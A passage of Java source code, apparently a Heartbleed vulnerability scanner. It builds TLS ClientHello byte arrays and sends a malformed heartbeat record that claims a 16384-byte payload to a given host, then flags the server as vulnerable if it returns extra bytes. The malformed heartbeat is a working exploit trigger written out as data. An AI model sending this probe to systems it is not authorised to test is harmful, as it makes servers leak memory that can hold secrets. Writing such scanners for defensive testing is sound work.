            (byte)0xC0,(byte)0x98, //TLS_RSA_PSK_WITH_CAMELLIA_128_CBC_SHA256
            (byte)0xC0,(byte)0x99, //TLS_RSA_PSK_WITH_CAMELLIA_256_CBC_SHA384
            (byte)0xC0,(byte)0x9A, //TLS_ECDHE_PSK_WITH_CAMELLIA_128_CBC_SHA256
            (byte)0xC0,(byte)0x9B, //TLS_ECDHE_PSK_WITH_CAMELLIA_256_CBC_SHA384
            (byte)0xC0,(byte)0x9C, //TLS_RSA_WITH_AES_128_CCM
            (byte)0xC0,(byte)0x9D, //TLS_RSA_WITH_AES_256_CCM
            (byte)0xC0,(byte)0x9E, //TLS_DHE_RSA_WITH_AES_128_CCM
            (byte)0xC0,(byte)0x9F, //TLS_DHE_RSA_WITH_AES_256_CCM
            (byte)0xC0,(byte)0xA0, //TLS_RSA_WITH_AES_128_CCM_8
            (byte)0xC0,(byte)0xA1, //TLS_RSA_WITH_AES_256_CCM_8
            (byte)0xC0,(byte)0xA2, //TLS_DHE_RSA_WITH_AES_128_CCM_8
            (byte)0xC0,(byte)0xA3, //TLS_DHE_RSA_WITH_AES_256_CCM_8
            (byte)0xC0,(byte)0xA4, //TLS_PSK_WITH_AES_128_CCM
            (byte)0xC0,(byte)0xA5, //TLS_PSK_WITH_AES_256_CCM
            (byte)0xC0,(byte)0xA6, //TLS_DHE_PSK_WITH_AES_128_CCM
            (byte)0xC0,(byte)0xA7, //TLS_DHE_PSK_WITH_AES_256_CCM
            (byte)0xC0,(byte)0xA8, //TLS_PSK_WITH_AES_128_CCM_8
            (byte)0xC0,(byte)0xA9, //TLS_PSK_WITH_AES_256_CCM_8
            (byte)0xC0,(byte)0xAA, //TLS_PSK_DHE_WITH_AES_128_CCM_8
            (byte)0xC0,(byte)0xAB, //TLS_PSK_DHE_WITH_AES_256_CCM_8
            (byte)0xC0,(byte)0xAC, //TLS_ECDHE_ECDSA_WITH_AES_128_CCM
            (byte)0xC0,(byte)0xAD, //TLS_ECDHE_ECDSA_WITH_AES_256_CCM
            (byte)0xC0,(byte)0xAE, //TLS_ECDHE_ECDSA_WITH_AES_128_CCM_8
            (byte)0xC0,(byte)0xAF, //TLS_ECDHE_ECDSA_WITH_AES_256_CCM_8
            0x00,(byte)0xFF, //TLS_EMPTY_RENEGOTIATION_INFO_SCSV

            //compression methods length, etc
            (byte)0x01, (byte)0x00, (byte)0x00, (byte)0x49, (byte)0x00, (byte)0x0b, (byte)0x00, (byte)0x04,
            (byte)0x03, (byte)0x00, (byte)0x01, (byte)0x02, (byte)0x00, (byte)0x0a, (byte)0x00, (byte)0x34,  (byte)0x00, (byte)0x32, (byte)0x00, (byte)0x0e, (byte)0x00, (byte)0x0d, (byte)0x00, (byte)0x19,
            (byte)0x00, (byte)0x0b, (byte)0x00, (byte)0x0c, (byte)0x00, (byte)0x18, (byte)0x00, (byte)0x09,  (byte)0x00, (byte)0x0a, (byte)0x00, (byte)0x16, (byte)0x00, (byte)0x17, (byte)0x00, (byte)0x08,
            (byte)0x00, (byte)0x06, (byte)0x00, (byte)0x07, (byte)0x00, (byte)0x14, (byte)0x00, (byte)0x15,  (byte)0x00, (byte)0x04, (byte)0x00, (byte)0x05, (byte)0x00, (byte)0x12, (byte)0x00, (byte)0x13,
            (byte)0x00, (byte)0x01, (byte)0x00, (byte)0x02, (byte)0x00, (byte)0x03, (byte)0x00, (byte)0x0f,  (byte)0x00, (byte)0x10, (byte)0x00, (byte)0x11, (byte)0x00, (byte)0x23, (byte)0x00, (byte)0x00,
            (byte)0x00, (byte)0x0f, (byte)0x00, (byte)0x01, (byte)0x01
    };

    static final byte heartbeatBuffer[] = {
            0x18,                   // Typ = 0x18 = HEARTBEAT_RECORD_TYPE
            0x03, 0x02,     // ?? (Looks like TLS version numbers, but is not)
            0x00, 0x03,             // Len = 0x00 0x03 = 3 in decimal
            0x01,                   // ???
            0x40, 0x00              // 0x40 0x00 = 16384 in decimal (the length of data we get back)
    };


    public TestResult test(String hostname, int port) {
        TestResult result = new TestResult();
        result.setVulnerable(false);
        try {
            //use the default HTTPS port, if the URI did not contain an explicit port number
            //or if the URL was via HTTP, rather than via HTTPS (yes, we will still check it)
            if (port == -1 || port == 80)
                port = 443;
            //String scheme = this.getBaseMsg().getRequestHeader().getURI().getScheme();
            //if (! scheme.equalsIgnoreCase("https")) {
            //      if (log.isDebugEnabled()) log.debug("Scheme "+ scheme +" does not indicate the use of SSL");
            //      return;
            //}
            log.info("Testing for Heartbleed");
            for (int tlsIndex = 0; tlsIndex < tlsBuffers.length; tlsIndex++) {
                log.info("\tTesting " + tlsNames[tlsIndex]);

                Socket socket = null;
                OutputStream os = null;
                InputStream is = null;
                try {
                    //establish a raw socket connection, without proxying it (the request will definitely not appear in Zap's history tab)
                    socket = new Socket();
                    try {
                        socket.connect(new InetSocketAddress(hostname, port), 2000);  //2 second timeout
                    } catch (Exception e) {
                        log.severe("Cannot establish a socket connection to " + hostname + ":" + port + " for HeartBleed");
                        System.exit(1);
                    }

                    //get the streams
                    os = socket.getOutputStream();
                    is = socket.getInputStream();

                    //send the client Hello
                    os.write(HeartBleedTester.handshakeRecordBuffer);
                    os.write(HeartBleedTester.tlsBuffers[tlsIndex]);
                    os.write(HeartBleedTester.helloBuffer);

                    while (true) {
                        SSLInternal sslMessage = recvmsg(is, 5000);  //2 second timeout
                        if (sslMessage.typ == 0x16 && sslMessage.len > 0 && sslMessage.pay[0] == 0x0E)
                            break;
                    }

                    boolean vulnerable = isVulnerable(is, os, 5000);  //2 second timeout on the check for each of SSL: 2.0, SSL 3.0, etc
                    if (vulnerable) {
                        log.info("Vulnerable");
                        //bingo!
                        result.addDetails(tlsNames[tlsIndex],", ");
                        result.setVulnerable(true);
                    }
                    if (is != null) is.close();
                    if (os != null) os.close();
                    if (socket != null) socket.close();
                } catch (Exception e) {
                    log.info("Not vulnerable using " + tlsNames[tlsIndex]);
                } finally {
                    if (is != null) is.close();
                    if (os != null) os.close();
                    if (socket != null) socket.close();
                }
            }
        } catch (Exception e) {
            //needed to catch exceptions from the "finally" statement
            log.severe(e.getMessage());
        }
        return result;
    }

    /**
     * determines if the SSL server behind the streams is vulnerable based on its response to malformed heartbeat message
     *
     * @param is
     * @param os
     * @return true or false
     * @throws IOException
     */
    private boolean isVulnerable(InputStream is, OutputStream os, int timeoutMs) throws IOException {

        //send the heartbeat request first, then start the clock ticking. tick tock, tick tock.
        os.write(HeartBleedTester.heartbeatBuffer);

        long startTime = System.currentTimeMillis();
        long timeoutTime = startTime + timeoutMs;
        long currentTime = startTime;

        while (true && currentTime <= timeoutTime) {
            SSLInternal sslMessage = recvmsg(is, timeoutMs);
            if (sslMessage.typ == 0x18) { //24
                //received the heartbeat response
                if (sslMessage.len > 3) {
                    //Got > 3 bytes back. Vulnerable.
                    return true;
                } else {
                    //Got <=3 bytes back. NOT Vulnerable.
                    return false;
                }
            }
            if (sslMessage.typ == 0x15) {  //21
                //server returned alert/error. unlikely to be vulnerable
                return false;
            }
            currentTime = System.currentTimeMillis();
        }
        //timed out.. and we haven't received a response to the heartvbeat.. not vulnerable
        return false;
    }

    /**
     * reads an SSL message from the inputstream
     *
     * @param is
     * @param timeoutMs the timeout in milliseconds
     * @return
     * @throws IOException
     */
    private static SSLInternal recvmsg(InputStream is, int timeoutMs) throws IOException {
        byte[] messageHeader = recvall(is, 5, timeoutMs);

        //convert the 5 bytes to (big endian) 1 unsigned byte type, 2 unsigned bytes ver, 2 unsigned bytes len
        ByteBuffer bb = ByteBuffer.wrap(messageHeader);
        byte type = bb.get();
        short ver = bb.getShort();
        short len = bb.getShort();

        //read the specified number of bytes from the inputstream
        byte[] messagePayload = recvall(is, len, timeoutMs);
        return new SSLInternal(type, ver, len, messagePayload);
    }

    /**
     * reads the requested number of bytes from the inputstream, blocking if necessary
     *
     * @param s      the inputstream from which to read
     * @param length the number of bytes to reas
     * @return a byte array containing the requested number of bytes from the inputstream
     * @throws IOException
     */
    private static byte[] recvall(InputStream s, int length, int timeoutMs) throws IOException {
        long startTime = System.currentTimeMillis();
        long timeoutTime = startTime + timeoutMs;
        long currentTime = startTime;

        byte[] buffer = new byte[length];
        int remainingtoread = length;
        while (remainingtoread > 0 && currentTime <= timeoutTime) {
            int read = s.read(buffer, length - remainingtoread, remainingtoread);
            if (read != -1)
                remainingtoread -= read;
            else
                throw new IOException("Failed to read " + length + " bytes. Read " + new Integer(length - remainingtoread) + " bytes");
            currentTime = System.currentTimeMillis();
        }
        //did we time out?
        if (currentTime >= timeoutTime)
            throw new IOException("Failed to read " + length + " bytes in " + timeoutMs + "ms due to a timeout. Read " + new Integer(length - remainingtoread) + " bytes");
        return buffer;
    }

    /**
     * a helper class used to pass internal SSL details around
     *
     * @author 70pointer@gmail.com
     */
    public static class SSLInternal {
        public byte typ;
        public short ver;
        public short len;
        public byte[] pay;

        SSLInternal(byte typ, short ver, short len, byte[] pay) {
            this.typ = typ;
            this.ver = ver;
            this.len = len;
            this.pay = pay;
        }
    }
}


